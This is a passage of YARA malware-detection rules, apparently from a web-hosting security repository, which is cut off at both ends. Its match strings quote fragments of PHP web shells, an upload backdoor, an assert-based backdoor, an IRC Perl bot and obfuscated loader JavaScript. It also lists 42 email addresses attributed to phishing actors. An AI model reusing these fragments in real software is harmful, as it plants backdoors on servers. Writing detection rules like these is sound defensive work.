      $s6 = "my $From = '--REVENUE--<support@deliveroo.ie>'; # from addr" fullword ascii
      $s7 = "print \"[+][\".(localtime).\"] Started with $threads threads \\n\\n\";" fullword ascii
      $s8 = "my $forkmanager = new Parallel::ForkManager($threads);" fullword ascii
      $s9 = "if  (!$threads){ $threads = \"10\";}" fullword ascii
   condition:
      ( uint16(0) == 0x7375 and
         filesize < 4KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-22
   Identifier: shell
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */


rule infected_08_22_18_perl_shell_t {
   meta:
      description = "shell - file t"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "670e0f43e3fee8532bd28fa236008527287feadd7ce4c1d46566c23dc634adb8"
   strings:
      $x1 = "\"\\001bitchx-1.0c18 :tunnelvision/1.2\\001\",\"\\001PnP 4.22 - http://www.pairc.com/\\001\"," fullword ascii
      $x2 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002\\00312xMap Portscanning\\003\\002: $1 \\002\\00312Ports:\\003\\002 $2-$3\");" fullword ascii
      $x3 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002\\00312Portscanning\\003\\002: $1 \\002\\00312Ports:\\003\\002 default\");" fullword ascii
      $x4 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002\\00312(UDP Complete):\\003\\002 $1 - \\002Sendt\\002: $pacotese\".\"kb -" fullword ascii
      $s5 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :Port Scan Complete with target: $1 \");" fullword ascii
      $s6 = "$shell = \"cmd.exe\";" fullword ascii
      $s7 = "\"\\001ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.8+OperMods v1.0 by acidflash - Almost there\\001\");" fullword ascii
      $s8 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002\\00312(Download)\\002\\00314 Page: $2 (File: $1)\") if ($xstats);" fullword ascii
      $s9 = "\"\\001HydraIRC v0.3.148 (18/Jan/2005) by Dominic Clifton aka Hydra - #HydraIRC on EFNet\\001\"," fullword ascii
      $s10 = "\"\\001ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.6mods v1.0 by acidflash - Almost there\\001\"," fullword ascii
      $s11 = "\"\\001irssi v0.8.10 - running on Linux i586\\001\",\"\\001irssi v0.8.10 - running on FreeBSD i386\\001\"," fullword ascii
      $s12 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[x] ->\\0034 Injection ...\");" fullword ascii
      $s13 = "sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");" fullword ascii
      $s14 = "\"\\001BitchX-1.1-final+ by panasync - Linux 2.6.18.1 : Keep it to yourself!\\001\"," fullword ascii
      $s15 = "\"\\001BitchX-1.0c19+ by panasync - Linux 2.4.33.3 : Keep it to yourself!\\001\"," fullword ascii
      $s16 = "my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);" fullword ascii
      $s17 = "system(\"cd /var/tmp ; rm -rf cb find god* wunder* udev* lib*\");" fullword ascii
      $s18 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002\\00312(UDP Complete):\\003\\002 $1 - \\002Sendt\\002: $pacotese\".\"kb - \\002" ascii
      $s19 = "\"\\001ircN 8.00 - he tries to tell me what I put inside of me -\\001\"," fullword ascii
      $s20 = "return _trivial_http_get($host, $port, $path);" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and
         filesize < 80KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule perl_socks_proxy
{

    meta:
       author = "Brian Laskowski"
       info = " perl socks proxy 05/21/18 "

    strings:
    
	$s1="/usr/bin/perl"
	$s2="socks_bind"
	$s3="socks_connect"
	$s4="socks_do"

    condition:
    all of them
}

rule phishing_actor_emails

{

    meta:
       author = "Brian Laskowski"
       info = " emails associated as the recipents of phishing campaigns "

    strings:
    
	$a1= "bartr40@gmail.com"
	$a2= "james.bergkamp25@gmail.com"
	$a3= "bergkamp.james26@gmail.com"
	$a4= "wordpass487@gmail.com"
	$a5= "grisoy91@msn.com"
	$a6= "incoming@l3380.site"
	$a7= "chopdodo001@gmail.com"
	$a8= "mrlarrysss@gmail.com"
	$a9= "iyalaya00@gmail.com"
	$a10="fadawfaissal1@gmail.com"
	$a11="Rush3@live.ru"
	$a12="rezult1996@gmail.com"
	$a13="rezult277@gmail.com"
	$a14="evansjohnny40@gmail.com"
	$a15="herren.ruth@gmail.com"
	$a16="loveofwisdom119@gmail.com"
	$a17="groundsnetz@gmail.com"
	$a18="kellyrauch16@gmail.com"
	$a19="log.alone2@gmail.com"
	$a20="log.alone@protonmail.com"
	$a21="sikkens40@zoho.com"
	$a22="sikkens40@gmail.com"
	$a23="mandrell009@gmail.com"
	$a24="born.last@yandex.com"
	$a25="serverupdate@yahoo.com"
	$a26="spaul8608@gmail.com"
	$a27="chrismason601@gmail.com"
	$a28="successful.drizzy@gmail.com"
	$a29="zzxxccah22@gmail.com"
	$a30="infodervice@gmail.com"
	$a31="razinekhaled@gmail.com"
	$a32="heymuspapa@gmail.com"
	$a33="napolitanoj17@yahoo.com"
	$a34="resulteere1121@outlook.com"
	$a35="herefordboyd1@yandex.com"
	$a36="mr.magma2017@gmail.com"
	$a37="casualonakoya@gmail.com"
	$a38="lentomass60@gmail.com"
	$a39="orangebillings@gmail.com"
	$a40="anonnymusrezult@gmail.com"
	$a41="stegmollersarah@gmail.com"
	$a42="halifax89@yandex.com"

    condition:
    
	any of them
}
rule generic_php_injection_0
{

    meta:
       author = "Brian Laskowski"
       info = " drupal injection "

    strings:
    
    $s1="$GLOBALS"
    $s2="Array();global"
    $s3="eval"
    $s4="NULL"

    condition:
    all of them
}
rule generic_php_injection_1
{

    meta:
       author = "Brian Laskowski"
       info = " general php injection 05/16/18 "

    strings:
    
    $s1="Array()"
    $s2="foreach"
    $s3="eval"
    $s4="($_COOKIE, $_POST)"
    $s5="exit()"
    $s6="function"
    $s7="<?php"
    $s8="return"

    condition:
    all of them
}

rule generic_php_03

{

	meta:
	 author= "Brian Laskowski"
	 date= "5/29/18"
	 description= "example.sites.php malware"
	strings:
	$a= "function_exists"
	$b= "function"
	$c= "for"
	$d= "xor"
	$e= "chr"
	$f= "strlen"
	$g= "return"
	$h= "=array"
	$i= "?php"

	condition:
	all of them
}
rule PHP_Mailer_K

{
        meta:
        author= "Brian Laskowski"
        info= " php mailer sighted 05/10/18 https://www.virustotal.com/#/file/8144d69d27f0b5c209d6d7a995cc31e1ff0cdc341fc3b266938979947ac06cb2/detection "

        strings:
		$a= "urlencode($message)"
		$b= "urldecode($message)"
		$c= "stripslashes($message)"
		$d= "$email = explode"
		$e= "while($email[$i]"
		$f= "alert"
 

        condition:
                all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-26
   Identifier: 08-26-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule pop_up_cache_obsfuscated_malware {
   meta:
      description = "08-26-18 - file pop-up-cache.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-26"
      hash1 = "cd3f2a4a97098fd34619efaf298b68c3b2ff356f5fba071f4fef91ceb752d5de"
   strings:
      $s1 = "$zzrrzrz___=base64_decode(\"bjF6Ym1hNXZ0MGkyOC1weHVxeTZscmtkZzlfZWhjc3dvNGYzN2o=\");$z__zr_zzrr=$zzrrzrz___{30}.$zzrrzrz___{8}.$" ascii
      $s2 = "zrr__zr);}}');${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x7a\\x72\\x5f\\x7a\\x5f\\x7a\\x72\\x5f\\x7a\\x72\"]();?>" fullword ascii
      $s3 = "x7a\\x5f\\x5f\\x7a\\x72\"])?80:$zrrz_z__rz[\"\\x7a\\x5f\\x72\\x7a\\x72\\x7a\\x5f\\x5f\\x7a\\x72\"];}$zrr_zz_rz_=\\'Host:\\';$zrr" ascii
      $s4 = "__zzrrrz_,CURLOPT_USERAGENT,\\'WHR\\');${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x7a\\x5f\\x72\\x5f\\x5f\\x72\\x72\\x7a\\x7" ascii
      $s5 = "sdLtPS1wIA\\');unset($zrr_zz_rz_);$zrrzzz___r=\"GET $z__z_zzrrr HTTP/$z__rzr_rzz\\\\r\\\\n\".${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 60KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-07
   Identifier: prowli
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule _infected_06_07_18_prowli_botnet_IOC3_C2 {
   meta:
      description = "prowli - file IOC3-C2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-07"
      hash1 = "4b5066f743ec9fb32c85c579b12b87a10b9433a9988ce4439b07f82a553bfb6f"
   strings:
      $s1 = "ip2_log.txt" fullword ascii
      $s2 = "ip3_log.txt" fullword ascii
      $s3 = "mhcl_log.txt" fullword ascii
      $s4 = "dru_log.txt" fullword ascii
      $s5 = "ip4_log.txt" fullword ascii
      $s6 = "$myfile = file_put_contents( " fullword ascii
      $s7 = "elseif ( isset ($_GET[" fullword ascii
      $s8 = "if ( isset ($_GET[" fullword ascii
      $s9 = "if ( isset ($_GET[ " fullword ascii
   condition:
      ( uint16(0) == 0x6669 and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}

rule _infected_06_07_18_prowli_botnet_IOC2 {
   meta:
      description = "prowli - file IOC2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-07"
      hash1 = "39dbf136e4191edaae8bb30aa0085ebd7e998d3b89cfb623a5a7e49f573c71ea"
   strings:
      $s1 = "99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 122, 41, 59));" fullword ascii
      //$s2= "<script language=javascript>eval(String.fromCharCode(118, 97, 114, 32, 122, 32, 61,"
   condition:
      ( uint16(0) == 0x733c and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}

rule _infected_06_07_18_prowli_botnet_IOC1 {
   meta:
      description = "prowli - file IOC1.js"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-07"
      hash1 = "0050aeefafcf679f9b9a925341d4ed61a9eb5c3e3fc17b653af730d543b6b080"
   strings:
      $s1 = "104, 116, 116, 112, 115, 58, 47, 47, 115, 116, 97, 116, 115, 46, 115, 116, 97, 114, 116, 114, 101, 99, 101, 105, 118, 101, 46, " fullword ascii
      $s2 = ", 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 122, 41, 59));" fullword ascii
      $s3 = "eval(String.fromCharCode" fullword ascii
   condition:
      ( uint16(0) == 0x7665 and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-02-22
   Identifier: 02-22-19
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_02_22_19_yt9 {
   meta:
      description = "02-22-19 - file yt9.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-02-22"
      hash1 = "aef6a4ec5ff827c7c64d58d0a2e69e97dc4f068674ed9d491405125690953f5e"
   strings:
      $s1 = "6b\"]($l1wb,\"GET $l1yg5ril HTTP/1.0\\r\\nHost:\".$l1QnNwu1[\"host\"].\"\\r\\nConnection:Close\\r\\n\\r\\n\");$l1ZWYO='';while(!" ascii
      $s2 = "';$bb6bb=explode(\"1l\",\"esolc_lruc1lfoef1lstsixe_noitcnuf1lteg_ini1ldro1ltroba_resu_erongi1lstegf1ldomhc1ltilps_gerp1lemitotrt" ascii
      $s4 = "CURLOPT_URL,$l1fwC);$GLOBALS[\"b6bb66b6\"]($l1BoXNr,CURLOPT_USERAGENT,$GLOBALS[\"bb66b66\"]);$GLOBALS[\"b6bb66b6\"]($l1BoXNr,CUR" ascii
      $s5 = "\"host\"],isset($l1QnNwu1[\"port\"])?$l1QnNwu1[\"port\"]:80,$l1j26ya,$l13Q,30);if($l1wb){$l1yg5ril=isset($l1QnNwu1[\"path\"])?$l" ascii
      $s6 = "b6b6666\"].$_SERVER[\"HTTP_HOST\"].$_SERVER[\"REQUEST_URI\"];l1urD5xY($l15halO);}function l1urD5xY($l1fwC){$l1yg5ril=0;if($GLOBA" ascii
      $s7 = "Y[\"HTTP_X_FORWARDED_SSL\"]){return true;}if($GLOBALS[\"bb6bbb66b\"]($GLOBALS[\"b6bb6\"],$l1TXY)&&$GLOBALS[\"b6666\"]===$l1TXY[" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 2 of them )
      ) or ( all of them )
}


rule infected_02_22_19_fljm {
   meta:
      description = "02-22-19 - file fljm.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-02-22"
      hash1 = "1c27a38537e44aea98db227207d904eefb868d0a82034b53be7b76f535371dc6"
   strings:
      $s1 = "str_replace(\"j\",\"\",\"sjtrj_jrjejpljajcje\")" ascii
      $s2 = "<?php"
      $s3 = "(\"i\", \"\", \"ibiaisie6i4i_dieicoide\");"
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 2 of them )
      ) or ( all of them )
}

rule rfi_perl_bot
{

    meta:
       author = "Brian Laskowski"
       info = " rfi perl bot 05/21/18 "

    strings:
    
	$s1="/usr/bin/perl"
	$s2="RFI Scanner Bot"
	$s3="FeeLCoMz"

    condition:
    all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-30
   Identifier: shell1
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_30_18_s3sshll {
   meta:
      description = "shell1 - file s3sshll.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "1f43f36274d83c0c7c1cbd5e9017dfc2a9326829deaced88d49900c2d897d9ea"
   strings:
      $s1 = "$chk_login" ascii
      $s2 = "$password" ascii
      $s3 = "if(!function_exists("
      $s4 = "base64_decode"
      $s5 = "preg_match("
      $s6 = "<?php"
   condition:
         ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-07-29
   Identifier: sans-xme-072818
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule jquery_prettyphoto {
   meta:
      description = "sans-xme-072818 - file jquery.prettyphoto.js"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-29"
      hash1 = "977a811695dbbd370e162807e4c0fbc25c9fda8bba3417279c2f8ee1289a47e6"
   strings:
      $x1 = "$.prettyPhoto.close=function(){if($pp_overlay.is(\":animated\"))return;$.prettyPhoto.stopSlideshow();$pp_pic_holder.stop().find(" ascii
      $x2 = "movie='http://www.youtube.com/embed/'+movie_id;(getParam('rel',pp_images[set_position]))?movie+=\"?rel=\"+getParam('rel',pp_imag" ascii
      $x3 = "if(settings.autoplay_slideshow&&!pp_slideshow&&!pp_open)$.prettyPhoto.startSlideshow();settings.changepicturecallback();pp_open=" ascii
      $s4 = "</div>',image_markup:'<img id=\"fullResImage\" src=\"{path}\" />',flash_markup:'<object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-" ascii
      $s5 = "if($.browser.msie&&$.browser.version==6)$('select').css('visibility','hidden');if(settings.hideflash)$('object,embed,iframe[src*" ascii
      $s6 = "$.prettyPhoto.open=function(event){if(typeof settings==\"undefined\"){settings=pp_settings;if($.browser.msie&&$.browser.version=" ascii
      $s7 = "return;$pp_pic_holder.css({'top':projectedTop,'left':(windowWidth/2)+scroll_pos['scrollLeft']-(contentwidth/2)});};};function _g" ascii
      $s8 = "$pp_pic_holder.fadeIn(function(){(settings.show_title&&pp_titles[set_position]!=\"\"&&typeof pp_titles[set_position]!=\"undefine" ascii
      $s9 = "function _getFileType(itemSrc){if(itemSrc.match(/youtube\\.com\\/watch/i)||itemSrc.match(/youtu\\.be/i)){return'youtube';}else i" ascii
      $s10 = "$.prettyPhoto.close();e.preventDefault();break;};};};});};$.prettyPhoto.initialize=function(){settings=pp_settings;if(settings.t" ascii
      $s11 = "/quicktime\" pluginspage=\"http://www.apple.com/quicktime/download/\"></embed></object>',iframe_markup:'<iframe src =\"{path}\" " ascii
      $s12 = "=false;pp_dimensions=_fitToViewport(movie_width,movie_height);doresize=true;skipInjection=true;$.get(pp_images[set_position],fun" ascii
      $s13 = "ader.onload=function(){pp_dimensions=_fitToViewport(imgPreloader.width,imgPreloader.height);_showContent();};imgPreloader.onerro" ascii
      $s14 = "script type=\"text/javascript\" src=\"http://platform.twitter.com/widgets.js\"></script></div><div class=\"facebook\"><iframe sr" ascii
      $s15 = "new Function(atob(\"dmFyIF8weDQ5ZTY9WydjYW5jZWxlZCcsJ2Vycm9yJywnb3B0X2luX2NhbmNlbGVkJywnX2Nvbm5lY3QnLCdsYXN0UGluZ1JlY2VpdmVkJywn" ascii
      $s16 = "Author: Stephane Caron (http://www.no-margin-for-errors.com)" fullword ascii
      $s17 = "if($.browser.msie&&$.browser.version==6)$('select').css('visibility','hidden');if(settings.hideflash)$('object,embed,iframe[src*" ascii
      $s18 = "movie='http://www.youtube.com/embed/'+movie_id;(getParam('rel',pp_images[set_position]))?movie+=\"?rel=\"+getParam('rel',pp_imag" ascii
      $s19 = "function getParam(name,url){name=name.replace(/[\\[]/,\"\\\\\\[\").replace(/[\\]]/,\"\\\\\\]\");var regexS=\"[\\\\?&]\"+name+\"=" ascii
      $s20 = "n=(arguments[3])?arguments[3]:0;_build_overlay(event.target);}" fullword ascii
   condition:
      ( uint16(0) == 0x2a2f and
         filesize < 700KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-28
   Identifier: 10-29-18
   Reference: https://github.com/Hestat/lw-yara/
   Reference2: https://blog.sucuri.net/2018/10/saskmade-net-redirects.html
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_10_29_18_saskmade_net {
   meta:
      description = "10-29-18 - redirect code"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "4b6b3b2353ec7e6799ec439aeb8d09c4208e81876d7c7f8a07df6360f14452b9"
   strings:
      $s1 = "var _0x1e35=['length','fromCharCode','createElement','type','async','code121','src','appendChild','getElementsByTagName','script" ascii
      $s2 = "var _0x1e35=['length','fromCharCode','createElement','type','async','code121','src','appendChild','getElementsByTagName','script" ascii
      $s3 = "{if(scrpts[i]['id']==_0x5a05('0x4')){n=![];}};if(n==!![]){a();}" fullword ascii
   condition:
      ( uint16(0) == 0x6176 and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
rule infected_05_29_18_case109_case109_scanner {
   meta:
      description = "case109 - file scanner.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "35bbe0242fbd1ea511e7272d43d8351a9a0033551a204cc612776571cf159651"
   strings:
      $s1 = "// Scanconfig 4.0 - www.code-security.com" fullword ascii
      $s2 = "// Author : uzanc | uzanc@live.com" fullword ascii
      //$s3 = "donesian Coder - Surabaya Hackerlink - Serverisdown - And All Forum Hacking In The World" fullword ascii
      $s4 = "eval(base64_decode($scanconfig))" fullword ascii
      $s5 = "// Thanks for : Hacker Cisadane - Lumajangcrew - TMTC 2 - Devilzc0de - Hacker Newbie - Indonesian Cyber - Indonesian Hacker - In" ascii
      $s6 = "// Thanks for : Hacker Cisadane - Lumajangcrew - TMTC 2 - Devilzc0de - Hacker Newbie - Indonesian Cyber - Indonesian Hacker - In" ascii
      $s7 = "evilgirl | blackboy007 | dopunk | l1n9g4 | spykit | and you" fullword ascii
      $s8 = "// Supporter by : cakill | xadpritox | dansky | arulz | direxer | jhoni | guard | nacomb13 | nobita_chupuy | mr.at | zerocool | " ascii
      //$s9 = "ml0eS5jb208L2E+IC0gPGEgaHJlZj0iaHR0cDovL2hhY2tlci1jaXNhZGFuZS5vcmciIHRhcmdldD1fYmxhbms+d3d3LmhhY2tlci1jaXNhZGFuZS5vcmc8L2E+DQo8L" ascii
   condition:
       all of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-25
   Identifier: 09-25-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule search_result_tpl {
   meta:
      description = "09-25-18 - file search-result.tpl.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-25"
      hash1 = "19508e2167f2d639b7385eb348eb104e2f56fff06ddc8e7fa9b2a78906cbdd20"
   strings:
      $s1 = "isset($_REQUEST['vzmuie']) && array_map(\"ass\\x65rt\",(array)$_REQUEST['vzmuie']); if ($snippet)" fullword ascii
   condition:
      ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-01-31
   Identifier: 01-31-19
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_01_31_19_minify {
   meta:
      description = "01-31-19 - file minify.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-01-31"
      hash1 = "48dee7233033b71174a063d1241754aa493ac33cd6f47487d130ed2a117f3856"
   strings:
      $s1 = "function mc($OQ,$Ba)" fullword ascii
      $s2 = "$AP=\"f152ff3d0236535f1a5feb9272731e47\";" fullword ascii
      $s3 = "<?php"
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 90KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_01_31_19_mod_Php {
   meta:
      description = "01-31-19 - file mod_Php.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-01-31"
      hash1 = "85f6dcc537fc211d7aeef8640a6b5feb5dc226ea41350156424722e2f4fdd27c"
   strings:
      $s1 = "$VLfhEzqV1187 = \"HjwxOhEpUAxvZk9QECoHZRcpAQNVdn5NORQ2PypcUBZUAnFEECoTOCkDL1RUeWpRAzoPZBI5UBB6cmpcADobPBc5EVVuAm5NADt4PBIDL1F6cm" ascii
      $s2 = "CEy4mOxI5XFV9YmpRDyh4ACUoGgtVdXVZAj4qMz8HKAxmWHEAHjwuMzotKAJ/cnlQEy4AMzotKAJ/cnlQEy4AMzopPw9XdgBQEwQDIikHKA5Vdn5ZADUMPTwZWS5/cnl" ascii
      $s3 = "HOQd1bD9dOw1vXEBbCgQiGjAJAi96WFsPFl4TPyMEHhNSeXEcCiUTLSMEEVVsdQwPFl4TPyMEEVVsdQwPOzp0Ixc2OAJSeVRAADlwLhc5IxFXaWlQPgAHJxc5PFx/Www" ascii
      $s4 = "QA18XJxEmKw1sdmpHOAAibTkUIAt/dnZbOCo5LhApLw9XZg1ZCj4iIzkUXV1SeXEcHjwubBcpOE5geVRAADk2IhcpOE5meWpcCgYpIhBdOF16AmpcCgc5ZCkqXChUA1x" ascii
      $s5 = "9GTwqHhI5MAp/YmoHOzUTJyk9Ai9TRgh8GTwqHjA/Ai91YFRbA18pIjotCl1SeXEcEBcyGjAJAi91YFN9GTwqHikDUBxsZn5dOy4mPxI2OwlUYnpfORQAPxJcP1B/dQg" ascii
      $s6 = "ZCiUTLSMEEVVsdQwPFl4TPyMEEVVsdQwPPioHPREpPAJVAmoCOCoUbToAKw1sdmpHOAAiIBEpPwhSdVdPFDUDYDoEXV1SeXEcCiUTPyMEER9Vdn5CCgY5IilcBRBmcgF" ascii
      $s7 = "HOAc2IhcpOE5meWpcCgEDPBBdJ1ZUAnJcCi54ZCkqXV1SdmkcCCoHZCo5Iw1VA20PFl4TPyMEEVVsdQwPFl4TPyMEHhNSeXEcCiUTLSMJWS5mdlRCOSUXZDomO1BVdm0" ascii
      $s8 = "YEF14ADomMwlVX3ZHOF91Oj8tKyRsXFREADt4Oik2OwNvAwFCPioXIRcmJAp8SAFAOQB4Pj9dMwlVX3ZHOF91Ojg9AlJyYFdQEy4AMzotKAJ/cnlQEy4DZxBcUDFsZnZ" ascii
      $s9 = "HCjs2PSkXDgtkXFREADUPARFcUBZVSFtEOAMXJxEtEVVXdlRNFgAYIRcDLxZSZm1EEF9wJikDBRZsYltHFV4LOBcmPxxUWHpaAzo5Lik6HQZ/WwwPOV4DPBEEXCtvZkx" ascii
      $s10 = "$j = $P(\"/*eiGjcUfV9764*/\", $dTOsVUZI5225( mPmit($dTOsVUZI5225($VLfhEzqV1187), \"ZmATsnie6187\")));" fullword ascii
      $s11 = "cDygpBTopBRBsXAAPFl8mLCMEEQ5XaWFQA185PBBdJFxvAwFCPioXIRcqXV1VAmoCOCoUfz8AKAJTA3ZBOCp4LTwHJBJ7dXkAPDk2IhBdO1BUdm0cEBcyGjAJAi9UA3J" ascii
      $s12 = "AHjwuMzotKAJSXH5OEyoQMyM9Kw5UA3YGODoXIRcqGit1VlRaPjp0PhcpBRNUWHpNADUQOyo9EQ96eXlPFiUALT8mKB96dnZYAzULLik2OBV/eUt5GQoqHhI5MApvYn0" ascii
      $s13 = "cFjoPIhEpUBx5WHVNFxcPbTc/GRJVXG4AAAB4IRctWAhvZglHOCUqYiJcUFRVXFRbOQQ5GhFcXBNVAnpfA18UYxU/WS5mcgFNPiUtJyk6XSt1W0BNA14LJBAmOE5yYFd" ascii
      $s14 = "ZFz4iMypcPxZUeXZAAzoPJBEDClx8S3lZEyUlJCkmOwpmYlsGFy4UOiMJWS51YFN9CiUTLSMEEVVscnoEOzoTZBIqWQt7Ym1ZCgETOBYmOFNmcgEHACl1bBcpOE5mdlR" ascii
      $s15 = "aOzo5OCstIFJsdgFdPjpwOBEAOBBVA2FCOSkIIRcDLxZSZm0OPiopJBAXXAh6X2JfOCUXODxcOxNvAm5DADp0ZD8AJwh6X3YGAwBwJBctDhV5AnJbPiUXLREHKwhvZkB" ascii
      $s16 = "aOF90ZDopJxNUdgFOCjULOCkqXDViW09BAAB4IRcqXQt5WFsPAAB4IRctKw9UA0BBOQdwOhADPwlUWwwPAwd0BCEFMF16A3EcCi54ORFcXFVmWFtHHjwuMzotKAJ/cnl" ascii
      $s17 = "9ECUTIBAtKFx/dn5OOQAHYTgtDRBvZglbEBQAbSMHKA5sdlROC194IRcpPxBSd0tcOztxJzc/Bi91YFN9GT4AOhApL1VXcltQCjl1MzkrDShiAXJ1DisPNjlcJ1Zsclx" ascii
      $s18 = "QCioEMxImIwlsWwheExQIMxFcXA9UdlRdOxdxPSkXAQZ8AWJHOCoXLiUpUBNUeXZUEBQ5IRc5ERZ6d09ZEBR0ZRADEQlUXHZBACoUOzkpMwd8Aw1fODoUOis9AhB8AE9" ascii
      $s19 = "BEy4ibCkDUBxUYnpBOAMPZSoDWBVSdQheABQpIRc5ERZ6dg0GOCo2JystCgt/cgxQPjULJyk5XA9UA2pbES4TMiYrUDFgd0tZOSkEOis9AgJ6WHlZAi4iJxEAPxZUckB" ascii
      $s20 = "bOzoYOyIpBR9uA2pHOQQmPyFeETVnWn56D1wyOipdDQ58AAhQFgQAPykpBRxnAwFCPioXIRcoGg5XZwhHETxxHzA/Ai98dmpHOQMPNis9KFx/dn5OOQAHYStcWAlVXFx" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 400KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-04
   Identifier: case119
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule _06_04_18_case119_php_uploader {
   meta:
      description = "case119 - file db.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-04"
      hash1 = "0867e84e4d9d94a435d828b1464c39972455acf472e4be208ced097656dc338e"
   strings:
      $s1 = "<?php error_reporting(0);echo(\"Form#0x2515\");if(isset($_GET[\"u\"])){echo'<form ction=\"\" method=\"post\" enctype=\"multipart" ascii
      $s2 = "Upload!!!</b><br><br>';}else{echo'<b>Failed :@ :@ !!!</b><br><br>';}};};" fullword ascii
      $s3 = "<?php error_reporting(0);echo(\"Form#0x2515\");if(isset($_GET[\"u\"])){echo'<form ction=\"\" method=\"post\" enctype=\"multipart" ascii
      $s4 = "a\" name=\"uploader\" id=\"uploader\">';echo'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\"" ascii
      $s5 = "e=\"Upload\"></form>';if($_POST['_upl']==\"Upload\"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo'<b>Succ" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule _06_04_18_case119_ina_opfuscated_shell {
   meta:
      description = "case119 - file ina.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-04"
      hash1 = "c7bec8f3844658a2ed8f24a924a0b4e7e3ab21633b0a5fe15618face81b66222"
